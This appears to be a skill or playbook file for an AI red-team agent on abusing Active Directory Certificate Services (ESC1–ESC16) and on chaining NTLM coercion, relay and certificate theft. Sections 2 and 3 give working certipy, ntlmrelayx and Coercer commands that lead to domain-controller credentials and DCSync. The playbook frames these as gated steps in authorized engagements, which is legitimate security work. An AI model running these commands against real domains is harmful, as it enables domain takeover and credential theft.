---
name: playbook-adcs-coercion
description: AD CS abuse (Certipy ESC1-ESC16) and NTLM coercion→relay→ADCS kill chains — knowledge + tool routing for the network lane; coercion is an active, DC-affecting action behind a hard gate
---

# Playbook: AD CS (ESC1–ESC16) + NTLM Coercion

The single highest-ROI privilege-escalation surface in modern AD. Enumeration
is safe; coercion and relay are ACTIVE and can affect a domain controller — they
run only in an authorized engagement, and coercion is gated (Rule 5/6 mindset:
never disrupt production; confirm with the operator first).

Execution routes through the sanctioned network lane — `run_network_tool`
(netexec / impacket / certipy) and `record_redteam_action` / `record_loot` for
the ATT&CK-tagged operator log. This skill is the WHAT/WHEN; the tools are HOW.

## 1. Enumerate (safe, read-only)

```
run_network_tool(tool="certipy", args="find -u USER@DOMAIN -p PASS -dc-ip DC -stdout -vulnerable")
```
Certipy `find -vulnerable` reports ESC1–ESC16. Also enumerate CAs, templates
with `ENROLLEE_SUPPLIES_SUBJECT`, dangerous EKUs, and web-enrollment endpoints.
BloodHound CE (`ingest_bloodhound`) shows who can enroll.

## 2. The ESC catalogue (what each buys)

- **ESC1** template allows SAN + client-auth EKU, low-priv enroll → request cert
  AS a DA (`certipy req ... -upn administrator@domain`). Highest-frequency win.
- **ESC2** Any-Purpose EKU; **ESC3** enrollment-agent cert → request on behalf of.
- **ESC4** template ACL is writable → rewrite it into ESC1, exploit, restore.
- **ESC6** CA `EDITF_ATTRIBUTESUBJECTALTNAME2` → SAN on any request.
- **ESC7** CA-manager/officer rights → approve own requests / enable a template.
- **ESC8** HTTP web-enrollment + NTLM relay → relay a coerced DC$ to CES/CEP,
  get a DC cert (see coercion below). **ESC9/ESC10** no-mapping / weak cert
  mapping (schannel/UPN). **ESC11** IF_ENFORCEENCRYPTICERTREQUEST off → relay to
  RPC (ICPR). **ESC13** issuance-policy → group link. **ESC14** weak explicit
  altSecurityIdentities mapping. **ESC15/EKUwu (CVE-2024-49019)** v1 template
  app-policy injection. **ESC16** security-extension disabled domain-wide.
- Use `run_network_tool(tool="certipy", args="req ...")` to request, then
  `auth -pfx` for the TGT/NT-hash. `record_loot` the pfx + resulting hash.

## 3. Coercion → relay → ADCS (ESC8) — GATED

Active. Confirm scope + non-disruption with the operator BEFORE firing.

```
# 1. relay listener to the CA web-enrollment (impacket)
run_network_tool(tool="impacket", args="ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController")
# 2. coerce DC$ auth to the listener (Coercer: PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce)
run_network_tool(tool="coercer", args="coerce -u USER -p PASS -d DOMAIN -t DC_IP -l LISTENER_IP")
```

Result: a certificate for `DC$` → `certipy auth` → DC hash → DCSync. Coercer
picks the method (MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP); prefer the least-noisy that
works. If a method hangs a service, STOP — that is the disruption line.

## 4. Safety + evidence

- Never run coercion or relay outside an authorized window; they touch the DC.
- No destructive actions — this chain proves access (cert → hash → DCSync READ),
  it does not modify AD objects.
- `record_redteam_action(technique="T1649"/"T1557.001", ...)` for every active
  step; `record_loot` certs/hashes with chain-of-custody. Forward via
  `sync_to_ghostwriter`.
- Report as the kill-chain narrative to Domain Admin, mapped to ATT&CK — not a
  list of certipy invocations (Rule 16a).
